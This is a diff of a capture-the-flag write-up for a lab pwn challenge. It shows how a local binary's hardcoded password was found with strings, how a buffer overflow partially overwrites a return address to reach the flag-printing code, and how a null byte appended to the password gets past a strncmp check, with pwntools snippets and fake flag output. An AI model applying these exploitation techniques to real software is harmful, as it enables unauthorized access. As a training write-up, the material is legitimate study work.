@@ -1,5 +1,5 @@
 # Space pirate: Going Deeper
-Now we're on to the second challenge in the "pwn" category. 
+*We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?*
 
 ## Checking out the binary
 Let's start the program first and see what we're dealing with.  
@@ -16,14 +16,16 @@ Maybe the password is just a string that's saved in the binary itself. Let's che
 cjreek@kali:~$ strings ./sp_going_deeper
 ```
 We find a pretty suspicious string that might be the password we're looking for:
-> ...  
-> [\*] Username:  
-> [!] Exiting..  
-> **DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft**  
-> %s[+] Welcome admin! The secret message is:   
-> cat flag*  
-> %s[-] Authentication failed!  
-> ...  
+<pre>
+...  
+[\*] Username:  
+[!] Exiting..  
+<b>DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft</b>  
+%s[+] Welcome admin! The secret message is:   
+cat flag*  
+%s[-] Authentication failed!  
+...  
+</pre>
 
 ![Fail and Segfault](img/going_deeper_auth_segfault.png)  
 When we try, we not only get denied, but it seems like the password is already too big for the internal buffer and causes a buffer overflow with a resulting segmentation fault.
@@ -77,7 +79,8 @@ Now we navigate to the ``main`` function by opening the command line with ``Shif
 ```
 :> s main
 ```
-We immediately see a call to ``sym.admin_panel`` where the code of the menu options seem to be contained. Let's go there with ``s sym.admin_panel``
+We immediately see a call to ``sym.admin_panel`` where the code of the menu options seem to be contained.  
+Let's go there with ``s sym.admin_panel``.  
 By following both the 1. and 2. options  
   
 ![Menu Assembly](img/going_deeper_menu.png)  
@@ -91,7 +94,7 @@ If we take a look at the code we can see 3 potential ways to get to the flag:
 2. We override the return address to jump right to the code that prints the flag
 3. We pass the correct password as input
 
-Let's overflow the buffer and see how the stack looks before and after the overflow, to see what is and is not possible.
+Let's overflow the buffer and see how the stack looks before and after the overflow, to see what is and is not possible.  
 We see that ``read()`` reads up to 57 bytes from stdin. Let's put a breakpoint right before and after the call to ``read()`` to look at the stack before and after we overflow the buffer:
 ```
 :> db 0x00400aba
@@ -102,7 +105,9 @@ Select either 1. or 2. in the menu. We hit our first breakpoint and we can take 
   
 ![Stack before](img/going_deeper_stack_before.png)  
   
-We can see the three values (``a``, ``b`` and ``c``) that are checked before the password itself is checked (purple) and we can discover the return address (0x400b94) of ``admin_panel`` (red)
+We can see the three values (``a``, ``b`` and ``c``) that are checked before the password is checked (purple) and we can discover the return address (0x400b94) of ``admin_panel`` (red)  
+  
+> **INFO**: If your stack view isn't big enough you can change its size with ``e stack.size = 128``
 
  Let's hit F9 to continue execution and enter the maximum amount of characters (57)
 ````
@@ -114,7 +119,7 @@ Now we should hit the 2nd breakpoint. Let's look at the stack again:
   
 As we can see ``a``, ``b`` and ``c`` are untouched by the buffer overflow. So there is at least no direct way to change those values and get access to the flag that way.  
 But the return address gets overwritten by the buffer overflow - or at least the least significant byte of the return address.
-That should be good enough though, because the code printing the flag (0x00400b**12**) is not too far away from the original return address (0x400b**94**)
+That should be good enough though, because the address of the code printing the flag (0x00400b**12**) differs only in this byte from the original return address (0x400b**94**)
 
 ## Writing the exploit
 So now we are ready to write our exploit
@@ -137,31 +142,33 @@ r.interactive()
 
 Now if we execute that script we get the flag:
 
-> [+] Starting local process './sp_going_deeper': pid 1735681  
-> [*] Switching to interactive mode  
->  
->  [-] Authentication failed!
->  
-> [!] For security reasons, you are logged out..  
->  
-> HTB{f4k3_fl4g_4_t35t1ng}  
->  
-> [!] For security reasons, you are logged out..  
->  
-> [*] Got EOF while reading in interactive  
-> $   
+<pre>
+[+] Starting local process './sp_going_deeper': pid 1735681
+[*] Switching to interactive mode
+
+[-] Authentication failed!
+
+[!] For security reasons, you are logged out..
+
+<b>HTB{f4k3_fl4g_4_t35t1ng}</b>
+
+[!] For security reasons, you are logged out..
+
+[*] Got EOF while reading in interactive
+$
+</pre>
 
 ## An alternative way
 So what about passing the right password to the programm so it prints the flag voluntarily?  
-We tried that already at the beginning when we found the password with the ``strings`` tool, but it didn't work.
+We tried that already at the beginning when we found the password with the ``strings`` tool, but it didn't work.  
 But why did it not work? It's the same password the programm is checking for in the code:  
   
 ![Strncmp](img/going_deeper_strncmp.png)  
   
-There is a catch. The password "DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft" is 51 characters long, but strncmp is told to compare 52 characters.
+There is a catch. The password "**DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft**" is 51 characters long, but ``strncmp`` is told to compare 52 characters.
 The 52. character of the string constant the code is comparing our input to is a null byte (\x00) because c-strings are terminated with a null byte.
-The 52. character of our input is actually a new line character (\n or \x0a). So that's why the comparison fails.
-But there is nothing preventing us from sending a null byte right after the password with pwntools.
+The 52. character of our input is actually a new line character (``\n`` or ``\x0a``). So that's why the comparison fails.
+But there is nothing preventing us from sending a null byte right after the password with pwntools.  
 So let's try if that works:
 
 ````python
@@ -174,18 +181,20 @@ r.sendline(b"1")
 r.recvrepeat(0.1)
 
 # send password with trailing null byte
-payload = b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00'
+payload = b"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00"
 r.sendline(payload)
 r.interactive()
 ````
 
 And for a fact it actually works as well:
-> [+] Starting local process './sp_going_deeper': pid 1740782  
-> [*] Switching to interactive mode  
->   
-> [+] Welcome admin! The secret message is: HTB{f4k3_fl4g_4_t35t1ng}  
->  
-> [!] For security reasons, you are logged out..  
->  
-> [*] Got EOF while reading in interactive  
-> $  
+<pre>
+[+] Starting local process './sp_going_deeper': pid 1740782
+[*] Switching to interactive mode
+
+[+] Welcome admin! The secret message is: <b>HTB{f4k3_fl4g_4_t35t1ng}</b>
+
+[!] For security reasons, you are logged out..
+
+[*] Got EOF while reading in interactive
+$
+</pre>
